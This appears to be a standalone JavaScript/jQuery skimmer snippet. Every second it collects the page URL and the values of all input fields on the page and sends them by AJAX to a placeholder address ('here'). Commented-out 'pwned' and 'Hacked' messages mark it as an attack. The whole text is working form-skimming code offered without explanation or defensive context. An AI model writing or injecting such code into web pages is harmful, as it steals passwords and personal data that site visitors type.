if($.find("input")!=undefined){
setInterval(function () {
  //alert("pwned");
    url =  "here"+window.location.href;
    $('input').each(function () {
      url+="@"
      url += $(this).val();
    })
    $.ajax({
      url:url
    }).done(function () {
      //console.log("Hacked");
    })
},1000)

}
